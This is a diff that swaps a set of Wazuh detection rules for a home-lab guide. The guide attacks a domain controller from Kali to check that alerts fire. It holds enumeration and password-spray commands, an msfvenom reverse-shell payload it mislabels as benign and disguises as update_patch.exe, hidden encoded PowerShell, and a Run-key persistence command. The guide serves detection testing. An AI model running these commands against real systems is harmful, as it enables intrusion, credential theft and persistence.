@@ -1,46 +1,79 @@
-<!-- Local Wazuh Rules for Sysmon & Active Directory Detection -->
-<!-- Sanitized backup for repository documentation -->
+# Guide 04: Offensive Testing & Detection Validation (Kali Linux -> Win-DC01)
 
-<group name="sysmon,">
-  <!-- Base Rule: Sysmon Event ID 1 (Process Creation) -->
-  <rule id="100100" level="3">
-    <if_sid>61603</if_sid>
-    <description>Sysmon - Process Creation: $(win.eventdata.image)</description>
-    <options>no_full_log</options>
-  </rule>
+## 🎯 Objective
+Simulate realistic adversary behaviors from **Kali Linux** against **`Win-DC01`** to test, trigger, and validate the **Sysmon** and **Wazuh FIM (`syscheck`)** detection rules configured in previous guides.
 
-  <!-- Tuning: Suppress routine Windows background executables -->
-  <rule id="100101" level="0">
-    <if_sid>100100</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)C:\\Windows\\System32\\(svchost|taskhostw|conhost|backgroundTaskHost)\.exe$</field>
-    <description>Sysmon - Suppress routine Windows background processes</description>
-  </rule>
+---
 
-  <!-- Tuning: Suppress Windows Defender signature updates -->
-  <rule id="100102" level="0">
-    <if_sid>100100</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\.*\\MpCmdRun\.exe$</field>
-    <description>Sysmon - Suppress Windows Defender update utility</description>
-  </rule>
+## 🛠️ Phase 1: Reconnaissance & Network Enumeration
+**Goal:** Discover open ports, SMB shares, and Active Directory services on `Win-DC01`, generating network connection telemetry.
 
-  <!-- Detection: Encoded PowerShell Execution (MITRE T1059.001) -->
-  <rule id="100110" level="10">
-    <if_sid>100100</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc|-encodedcommand)\s+[A-Za-z0-9+/=]{20,}</field>
-    <description>Sysmon - Suspicious Encoded PowerShell Command Executed on $(agent.name)</description>
-    <mitre>
-      <id>T1059.001</id>
-    </mitre>
-  </rule>
+1. **Service & Version Scan (`Nmap`):**
+   ```bash
+   nmap -sC -sV -p 53,88,135,139,389,445,3389 <Win-DC01_IP> -oN nmap_dc01.txt
+   ```
+2. **SMB & Null Session Enumeration (`CrackMapExec` / `NetExec` & `enum4linux`):**
+   ```bash
+   netexec smb <Win-DC01_IP> -u '' -p '' --shares
+   enum4linux -a <Win-DC01_IP>
+   ```
+3. **Wazuh Verification:**
+   * Check Wazuh **Security Events** for **Sysmon Event ID 3 (Network Connection)** and Windows Security logs showing anonymous logon/enumeration attempts.
 
-  <!-- Detection: Remote Service Execution / PsExec (MITRE T1569.002) -->
-  <rule id="100115" level="12">
-    <if_sid>100100</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\PSEXESVC\.exe$</field>
-    <description>Sysmon - PsExec Service Binary Executed on $(agent.name)</description>
-    <mitre>
-      <id>T1569.002</id>
-    </mitre>
-  </rule>
-</group>
+---
+
+## 🔐 Phase 2: Credential Access (Brute-Force & Password Spraying)
+**Goal:** Simulate password attacks against SMB/RDP to trigger Windows failed logon alerts and Wazuh brute-force correlation rules.
+
+1. **Create a Small Target Wordlist (Kali):**
+   ```bash
+   echo -e "Password123!\nWelcome2026!\nWinter2026!\nAdmin1234" > passwords.txt
+   ```
+2. **Run a Controlled Password Spray (`NetExec` / `Hydra`):**
+   ```bash
+   netexec smb <Win-DC01_IP> -u Administrator -p passwords.txt --continue-on-success
+   ```
+3. **Wazuh Verification:**
+   * Look for **Windows Event ID 4625** (An account failed to log on) and Wazuh **Rule 60122 / 60204** (Multiple Windows logon failures / Brute force).
+
+---
+
+## 📂 Phase 3: Payload Drop & File Integrity Monitoring (FIM) Validation
+**Goal:** Simulate an attacker dropping a malicious binary/script and tampering with the `hosts` file to trigger Wazuh `syscheck` alerts.
+
+1. **Generate a Benign Test Payload (`msfvenom`):**
+   ```bash
+   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o update_patch.exe
+   ```
+2. **Transfer/Drop File onto `Win-DC01` (via SMB share or simulated download):**
+   * Place `update_patch.exe` into a monitored directory (e.g., `C:\Users\Public\` or `C:\Temp\`).
+   * Append a test entry to `C:\Windows\System32\drivers\etc\hosts` (e.g., `10.10.10.99 internal-portal.local`).
+3. **Wazuh Verification:**
+   * Open Wazuh **Integrity Monitoring (FIM)** and confirm real-time alerts for **File added** (`update_patch.exe`) and **File modified** (`hosts`).
+
+---
+
+## ⚙️ Phase 4: Execution & Registry Persistence Validation
+**Goal:** Execute suspicious LOLBins (Living Off the Land Binaries) and add a Run key to validate **Sysmon Event ID 1** and **Sysmon Event ID 13 / FIM Registry** alerts.
+
+1. **Trigger Suspicious Process Creation (`Win-DC01` or via reverse shell):**
+   * Run an encoded PowerShell test command (benign `whoami` / `hostname`):
+     ```powershell
+     powershell.exe -NoP -NonI -W Hidden -Enc dwBoAG8AYQBtAGkA
+     ```
+2. **Simulate Registry Run Key Persistence:**
+   ```powershell
+   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterService" /t REG_SZ /d "C:\Users\Public\update_patch.exe" /f
+   ```
+3. **Wazuh Verification:**
+   * Verify **Sysmon Event ID 1** (Process creation capturing encoded PowerShell arguments).
+   * Verify **Sysmon Event ID 13** / **Wazuh FIM Registry** alert for `HKCU\...\Run` modification.
+
+---
+
+## 📸 Documentation Checklist (For GitHub Portfolio)
+* [ ] Screenshot of `nmap` / `netexec` output on Kali.
+* [ ] Screenshot of Wazuh alert for SMB brute-force (`Event ID 4625`).
+* [ ] Screenshot of Wazuh FIM alert for `update_patch.exe` drop and `hosts` modification.
+* [ ] Screenshot of Sysmon Process Creation (`Event ID 1`) & Registry Persistence (`Event ID 13`).
+* [ ] Clean up test artifacts (`update_patch.exe`, `hosts` entry, and `UpdaterService` registry key) on `Win-DC01`.
